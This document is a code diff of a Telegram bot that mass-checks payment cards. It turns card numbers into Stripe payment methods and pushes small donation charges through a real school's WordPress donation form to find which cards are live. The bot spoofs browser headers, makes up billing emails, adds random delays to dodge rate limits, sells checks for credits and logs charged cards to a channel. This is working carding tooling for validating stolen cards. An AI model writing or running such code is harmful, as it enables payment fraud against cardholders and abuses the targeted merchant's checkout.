-            billing_address['name'],
-            "wpfs-billing-address-country":
-            billing_address['country'],
-            "wpfs-billing-address-line-1":
-            billing_address.get('address_line_1', '7246 Royal Ln'),
-            "wpfs-billing-address-line-2":
-            '',
-            "wpfs-billing-address-city":
-            billing_address['city'],
-            "wpfs-billing-address-state":
-            '',
-            "wpfs-billing-address-state-select":
-            billing_address['state'],
-            "wpfs-billing-address-zip":
-            billing_address['postal_code'],
-            "wpfs-card-holder-email":
-            email,
-            "wpfs-card-holder-name":
-            billing_address['name'],
-            "wpfs-stripe-payment-method-id":
-            pmid,
-            "_wpnonce":
-            checkout_nonce,
-            "wp_full_stripe_inline_donation_charge_nonce":
-            checkout_nonce,
-        }
-
-        async with session.post(f"{DOMAIN}/wp-admin/admin-ajax.php",
-                                headers=headers2,
-                                data=data2,
-                                timeout=5) as response:
-            if response.status == 200:
-                req2 = await response.text()
-            else:
-                # Clear cached checkout data on error
-                if hasattr(check_single_card_ultrafast, 'checkout_data'):
-                    delattr(check_single_card_ultrafast, 'checkout_data')
-                return card, "declined", f"❌ AJAX Error {response.status}", response.status
-
-        try:
-            result_data = json.loads(req2)
-            if isinstance(result_data, dict) and result_data.get('success'):
-                # If approved, clear checkout cache to get fresh page next time
-                if hasattr(check_single_card_ultrafast, 'checkout_data'):
-                    delattr(check_single_card_ultrafast, 'checkout_data')
-                return card, "approved", f"✅ Charged | Email: {email}", 200
-            else:
-                error_msg = "Declined"
-                if isinstance(result_data, dict):
-                    if 'message' in result_data:
-                        error_msg = result_data.get('message', 'Declined')
-                    elif 'data' in result_data and isinstance(
-                            result_data['data'], dict):
-                        if 'error' in result_data['data']:
-                            error_obj = result_data['data']['error']
-                            if isinstance(error_obj, dict):
-                                error_msg = error_obj.get(
-                                    'message', 'Declined')
-
-                # If declined, keep using same checkout page (don't clear cache)
-                return card, "declined", f"❌ {error_msg[:30]}", 0
-        except json.JSONDecodeError:
-            return card, "declined", "❌ Invalid JSON", 0
-
-    except Exception as e:
-        # Clear cache on any exception
-        if hasattr(check_single_card_ultrafast, 'checkout_data'):
-            delattr(check_single_card_ultrafast, 'checkout_data')
-        logger.error(f"Error in check_single_card_ultrafast: {e}")
-        return card, "declined", f"❌ Error: {str(e)[:20]}", 0
-
-
-def Tele_sync(card):
-    """Synchronous version of Tele function from combined.py"""
-    try:
-        ccx = card.strip()
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3]
-
-        if "20" in yy:
-            yy = yy.split("20")[1]
-
-        # Generate random amounts like in combined.py
-        random_amount1 = random.randint(1, 4)
-        random_amount2 = random.randint(1, 99)
-
-        headers = {
-            'authority':
-            'api.stripe.com',
-            'accept':
-            'application/json',
-            'accept-language':
-            'en-US,en;q=0.9',
-            'content-type':
-            'application/x-www-form-urlencoded',
-            'origin':
-            'https://js.stripe.com',
-            'referer':
-            'https://js.stripe.com/',
-            'sec-ch-ua':
-            '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile':
-            '?1',
-            'sec-ch-ua-platform':
-            '"Android"',
-            'sec-fetch-dest':
-            'empty',
-            'sec-fetch-mode':
-            'cors',
-            'sec-fetch-site':
-            'same-site',
-            'user-agent':
-            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
-
-        data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key={PK}'
-
-        response = requests.post('https://api.stripe.com/v1/payment_methods',
-                                 headers=headers,
-                                 data=data,
-                                 timeout=10)
-
-        if response.status_code != 200:
-            return f"Stripe Error {response.status_code}"
-
-        pm_data = response.json()
-        if 'error' in pm_data:
-            return f"Stripe: {pm_data['error'].get('message', 'Error')}"
-
-        pmid = pm_data.get('id')
-        if not pmid:
-            return "No payment method ID"
-
-        # Get billing address
-        billing_address = get_billing_address(n[:6])
-
-        headers = {
-            'authority': 'texassouthernacademy.com',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://texassouthernacademy.com',
-            'referer': 'https://texassouthernacademy.com/donation/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent':
-            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
-        }
-
-        data = {
-            'action':
-            'wp_full_stripe_inline_donation_charge',
-            'wpfs-form-name':
-            'donate',
-            'wpfs-form-get-parameters':
-            '%7B%7D',
-            'wpfs-custom-amount':
-            'other',
-            'wpfs-custom-amount-unique':
-            '0.50',
-            'wpfs-donation-frequency':
-            'one-time',
-            'wpfs-billing-name':
-            billing_address['name'],
-            'wpfs-billing-address-country':
-            billing_address['country'],
-            'wpfs-billing-address-line-1':
-            billing_address.get('address_line_1', '7246 Royal Ln'),
-            'wpfs-billing-address-line-2':
-            '',
-            'wpfs-billing-address-city':
-            billing_address['city'],
-            'wpfs-billing-address-state':
-            '',
-            'wpfs-billing-address-state-select':
-            billing_address['state'],
-            'wpfs-billing-address-zip':
-            billing_address['postal_code'],
-            'wpfs-card-holder-email':
-            f'{billing_address["name"].replace(" ", "")}{random_amount1}{random_amount2}@gmail.com',
-            'wpfs-card-holder-name':
-            billing_address['name'],
-            'wpfs-stripe-payment-method-id':
-            f'{pmid}',
-        }
-
-        response = requests.post(
-            'https://texassouthernacademy.com/wp-admin/admin-ajax.php',
-            headers=headers,
-            data=data,
-            timeout=10)
-
-        if response.status_code != 200:
-            return f"AJAX Error {response.status_code}"
-
-        result_data = response.json()
-        return result_data.get('message', 'Declined')
-
-    except Exception as e:
-        return f"Error: {str(e)[:50]}"
-
-
-async def mass_check_callback(update: Update,
-                              context: ContextTypes.DEFAULT_TYPE):
-    """Handle mass check callback"""
-    query = update.callback_query
-
-    try:
-        await query.answer()
-    except BadRequest:
-        pass
-
-    await query.edit_message_text(
-        "*📊 MASS CHECK SYSTEM*\n"
-        "══════════════════════\n"
-        "To Start A Mass Check:\n"
-        "1. Upload a .txt File With Cards\n"
-        "2. Use `/mchk` Command\n\n"
-        "*Format In File:*\n"
-        "`cc|mm|yy|cvv`\n"
-        "`cc|mm|yy|cvv`\n"
-        "...\n\n"
-        "*Features:*\n"
-        "• Approved Cards Are Shown\n"
-        "• Declined Cards Are Not Shown\n"
-        "• Cancel Anytime With /cancel\n"
-        "• Credits Deducted Per Card\n\n",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup(
-            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]))
-
 
 def log_charged_only(message_text, chat_id=None, username=None):
     """Log charged cards to LOG_CHANNEL (simplified version)"""
@@ -2503,7 +1934,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Start timer for speed measurement
     start_time = time.time()
 
-    # Check the card using the working function
+    # Check the card using the NEW checker function
     result_card, status, message_text, http_code = await check_single_card_fast(
         card_input)
 
@@ -2659,7 +2090,7 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id,
                                     context):
-    """ULTRA-FAST mass checking with universal format"""
+    """ULTRA-FAST mass checking with NEW checker engine"""
     processed = 0
     approved = 0
     declined = 0
@@ -2674,117 +2105,104 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id,
     # Calculate initial credits
     initial_credits = user.get("credits", 0)
 
-    # Create session for reuse
-    connector = aiohttp.TCPConnector(ssl=False)
-    timeout = aiohttp.ClientTimeout(total=30)
+    # Process cards one by one
+    for i, card in enumerate(cards):
+        # Check if cancelled
+        if user_id in checking_tasks and checking_tasks[user_id][
+                "cancelled"]:
+            break
 
-    try:
-        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
+        # Update status every 5 cards
+        if i % 5 == 0 or i == len(cards) - 1:
+            elapsed = time.time() - checking_tasks[user_id]["start_time"]
+            progress = (processed / len(cards)) * 100
 
-        # Process cards one by one
-        for i, card in enumerate(cards):
-            # Check if cancelled
-            if user_id in checking_tasks and checking_tasks[user_id][
-                    "cancelled"]:
-                break
+            try:
+                await status_msg.edit_text(
+                    f"<b>🚀 MASS CHECK IN PROGRESS</b>\n"
+                    f"══════════════════════\n"
+                    f"<b>Total Cards:</b> {len(cards)}\n"
+                    f"<b>Credits Used:</b> {credits_used}\n"
+                    f"<b>Status:</b> {progress:.1f}%\n\n"
+                    f"<b>Live Results:</b>\n"
+                    f"══════════════════════\n"
+                    f"✅ Approved: {approved}\n"
+                    f"❌ Declined: {declined}\n"
+                    f"⏳ Processed: {processed}/{len(cards)}",
+                    parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
 
-            # Update status every 5 cards
-            if i % 5 == 0 or i == len(cards) - 1:
-                elapsed = time.time() - checking_tasks[user_id]["start_time"]
-                progress = (processed / len(cards)) * 100
+        # Check single card using NEW checker
+        start_time = time.time()
+        result_card, status, message, http_code = await check_single_card_fast(
+            card)
+        actual_time = time.time() - start_time
 
-                try:
-                    await status_msg.edit_text(
-                        f"<b>🚀 MASS CHECK IN PROGRESS</b>\n"
-                        f"══════════════════════\n"
-                        f"<b>Total Cards:</b> {len(cards)}\n"
-                        f"<b>Credits Used:</b> {credits_used}\n"
-                        f"<b>Status:</b> {progress:.1f}%\n\n"
-                        f"<b>Live Results:</b>\n"
-                        f"══════════════════════\n"
-                        f"✅ Approved: {approved}\n"
-                        f"❌ Declined: {declined}\n"
-                        f"⏳ Processed: {processed}/{len(cards)}",
-                        parse_mode=ParseMode.HTML)
-                except Exception:
-                    pass
+        processed += 1
 
-            # Check single card
-            start_time = time.time()
-            result_card, status, message, http_code = await check_single_card_fast(
-                card)
-            actual_time = time.time() - start_time
+        # Update task data
+        if user_id in checking_tasks:
+            checking_tasks[user_id]["cards_processed"] = processed
 
-            processed += 1
+        # Determine if it's an actual decline or error
+        message_lower = str(message).lower() if message else ""
+        is_actual_decline = any(keyword in message_lower for keyword in [
+            'card', 'declined', 'insufficient', 'invalid', 'incorrect',
+            'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
+        ])
 
-            # Update task data
+        is_error = any(keyword in message_lower for keyword in [
+            'setup error', 'timeout', 'http error', 'network error',
+            'connection error', 'server error', 'internal error'
+        ])
+
+        if status == "approved":
+            approved += 1
+            credits_used += 1
             if user_id in checking_tasks:
-                checking_tasks[user_id]["cards_processed"] = processed
+                checking_tasks[user_id]["approved"] = approved
 
-            # Determine if it's an actual decline or error
-            message_lower = str(message).lower() if message else ""
-            is_actual_decline = any(keyword in message_lower for keyword in [
-                'card', 'declined', 'insufficient', 'invalid', 'incorrect',
-                'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
-            ])
+            # Send approved result using universal format
+            try:
+                # Get current user credits
+                current_user = await get_user(user_id)
+                current_credits = current_user.get("credits",
+                                                   0) - credits_used
 
-            is_error = any(keyword in message_lower for keyword in [
-                'setup error', 'timeout', 'http error', 'network error',
-                'connection error', 'server error', 'internal error'
-            ])
+                result_text = format_universal_result(
+                    card_data=result_card,
+                    status=status,
+                    message=message,
+                    credits_left=current_credits,
+                    username=username,
+                    time_taken=actual_time)
 
-            if status == "approved":
-                approved += 1
-                credits_used += 1
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["approved"] = approved
+                await context.bot.send_message(chat_id=chat_id,
+                                               text=result_text,
+                                               parse_mode=ParseMode.HTML)
 
-                # Send approved result using universal format
-                try:
-                    # Get current user credits
-                    current_user = await get_user(user_id)
-                    current_credits = current_user.get("credits",
-                                                       0) - credits_used
+                # Log charged cards
+                log_charged_only(result_text, chat_id, username)
 
-                    result_text = format_universal_result(
-                        card_data=result_card,
-                        status=status,
-                        message=message,
-                        credits_left=current_credits,
-                        username=username,
-                        time_taken=actual_time)
+            except Exception as e:
+                logger.error(f"Error sending approved result: {e}")
 
-                    await context.bot.send_message(chat_id=chat_id,
-                                                   text=result_text,
-                                                   parse_mode=ParseMode.HTML)
+        elif status == "declined" and is_actual_decline and not is_error:
+            declined += 1
+            credits_used += 1
+            if user_id in checking_tasks:
+                checking_tasks[user_id]["declined"] = declined
+        else:
+            # This was an error - don't count as decline for credit deduction
+            declined += 1
+            if user_id in checking_tasks:
+                checking_tasks[user_id]["declined"] = declined
 
-                    # Log charged cards
-                    log_charged_only(result_text, chat_id, username)
-
-                except Exception as e:
-                    logger.error(f"Error sending approved result: {e}")
-
-            elif status == "declined" and is_actual_decline and not is_error:
-                declined += 1
-                credits_used += 1
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["declined"] = declined
-            else:
-                # This was an error - don't count as decline for credit deduction
-                declined += 1
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["declined"] = declined
-
-            # Small delay to avoid rate limiting
-            if i < len(cards) - 1:
-                delay = random.uniform(0.5, 1.5)
-                await asyncio.sleep(delay)
-
-        # Close session
-        await session.close()
-
-    except Exception as e:
-        logger.error(f"Error in mass check: {e}")
+        # Small delay to avoid rate limiting
+        if i < len(cards) - 1:
+            delay = random.uniform(1.0, 2.0)  # Adjusted for new gateway
+            await asyncio.sleep(delay)
 
     # Final update after all cards processed
     elapsed = time.time() - checking_tasks[user_id]["start_time"]
@@ -3357,12 +2775,9 @@ async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML)
 
 
-# ==================== MASS CHECK FUNCTIONS ====================
-
-
 async def start_mass_check_callback(update: Update,
                                     context: ContextTypes.DEFAULT_TYPE):
-    """Start mass check from callback - ULTRA FAST with rotation"""
+    """Start mass check from callback"""
     query = update.callback_query
 
     try:
@@ -3432,184 +2847,6 @@ async def start_mass_check_callback(update: Update,
     # Cleanup file storage
     if user_id in files_storage:
         del files_storage[user_id]
-
-
-async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id,
-                                    context):
-    """ULTRA-FAST mass checking with rotation and live results"""
-    processed = 0
-    approved = 0
-    declined = 0
-    credits_used = 0  # Track actual credits used
-    user = await get_user(user_id)
-
-    # Calculate initial credits
-    initial_credits = user.get("credits", 0)
-
-    # Create session for reuse
-    connector = aiohttp.TCPConnector(ssl=False)
-    timeout = aiohttp.ClientTimeout(total=30)
-
-    try:
-        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-
-        # Process cards one by one with delays to avoid rate limits
-        for i, card in enumerate(cards):
-            # Check if cancelled
-            if user_id in checking_tasks and checking_tasks[user_id][
-                    "cancelled"]:
-                break
-
-            # Update status every 5 cards
-            if i % 5 == 0 or i == len(cards) - 1:
-                elapsed = time.time() - checking_tasks[user_id]["start_time"]
-                cards_per_second = processed / elapsed if elapsed > 0 else 0
-                progress = (processed / len(cards)) * 100
-
-                try:
-                    await status_msg.edit_text(
-                        f"<b>🚀 MASS CHECK IN PROGRESS</b>\n"
-                        f"══════════════════════\n"
-                        f"<b>Total Cards:</b> {len(cards)}\n"
-                        f"<b>Credits Used:</b> {credits_used}\n"
-                        f"<b>Status:</b> {progress:.1f}%\n\n"
-                        f"<b>Live Results:</b>\n"
-                        f"══════════════════════\n"
-                        f"✅ Approved: {approved}\n"
-                        f"❌ Declined: {declined}\n"
-                        f"⏳ Processed: {processed}/{len(cards)}",
-                        parse_mode=ParseMode.HTML)
-                except Exception:
-                    pass
-
-            # Check single card using your existing function
-            result_card, status, message, http_code = await check_single_card_fast(
-                card)
-
-            processed += 1
-
-            # Update task data
-            if user_id in checking_tasks:
-                checking_tasks[user_id]["cards_processed"] = processed
-
-            # Define which messages are actual card declines
-            actual_decline_keywords = [
-                'card', 'declined', 'insufficient', 'invalid', 'incorrect',
-                'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
-            ]
-
-            error_keywords = [
-                'setup error', 'timeout', 'http error', 'network error',
-                'connection error', 'server error', 'internal error',
-                'invalid response', 'no payment id', 'ajax error',
-                'stripe timeout'
-            ]
-
-            message_lower = message.lower() if message else ""
-            is_actual_decline = any(keyword in message_lower
-                                    for keyword in actual_decline_keywords)
-            is_error = any(keyword in message_lower
-                           for keyword in error_keywords)
-
-            if status == "approved":
-                approved += 1
-                credits_used += 1  # Deduct credit for approved
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["approved"] = approved
-
-                # Send approved result
-                try:
-                    # Get updated user info for the result
-                    current_user = await get_user(user_id)
-                    result_text = format_card_result(
-                        result_card, status, message,
-                        current_user.get("credits", 0), {
-                            "approved": approved,
-                            "declined": declined,
-                            "total_approved": current_user.get(
-                                "approved_cards", 0),
-                            "total_declined": current_user.get(
-                                "declined_cards", 0)
-                        })
-                    await context.bot.send_message(chat_id=chat_id,
-                                                   text=result_text,
-                                                   parse_mode=ParseMode.HTML)
-                except Exception as e:
-                    logger.error(f"Error sending approved result: {e}")
-
-            elif status == "declined" and is_actual_decline and not is_error:
-                declined += 1
-                credits_used += 1  # Deduct credit for actual decline
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["declined"] = declined
-            else:
-                # This was an error - don't count as decline for credit deduction
-                declined += 1
-                if user_id in checking_tasks:
-                    checking_tasks[user_id]["declined"] = declined
-
-            # Small delay to avoid rate limiting (tuned for speed)
-            if i < len(cards) - 1:
-                delay = random.uniform(0.5, 1.5)
-                await asyncio.sleep(delay)
-
-        # Close session
-        await session.close()
-
-    except Exception as e:
-        logger.error(f"Error in mass check: {e}")
-
-    # Final update after all cards processed
-    elapsed = time.time() - checking_tasks[user_id]["start_time"]
-    success_rate = (approved / len(cards) * 100) if cards else 0
-
-    # Update user data with actual credits used
-    updates = {
-        'credits': initial_credits - credits_used,
-        'credits_spent': user.get("credits_spent", 0) + credits_used,
-        'checks_today': user.get("checks_today", 0) + processed,
-        'total_checks': user.get("total_checks", 0) + processed,
-        'approved_cards': user.get("approved_cards", 0) + approved,
-        'declined_cards': user.get("declined_cards", 0) + declined,
-        'last_check_date':
-        datetime.datetime.now().date().isoformat()  # String date
-    }
-    await update_user(user_id, updates)
-
-    # Update bot statistics with actual credits used
-    await update_bot_stats({
-        'total_checks': processed,
-        'total_credits_used': credits_used,
-        'total_approved': approved,
-        'total_declined': declined
-    })
-
-    # Refresh user data
-    user = await get_user(user_id)
-
-    # Send summary
-    summary_text = f"""<b>🎯 MASS CHECK COMPLETE</b>
-══════════════════════
-<b>Statistics:</b>
-• Total Cards: {len(cards)}
-• ✅ Approved: {approved}
-• ❌ Declined: {declined}
-• Credits Used: {credits_used}
-• Time Taken: {elapsed:.1f}s
-• Success Rate: {success_rate:.1f}%
-
-<b>Your Balance:</b> {user.get('credits', 0)} credits
-══════════════════════
-"""
-
-    try:
-        await status_msg.edit_text(summary_text, parse_mode=ParseMode.HTML)
-    except Exception:
-        pass
-
-    # Cleanup
-    if user_id in checking_tasks:
-        del checking_tasks[user_id]
 
 
 async def cancel_check_callback(update: Update,
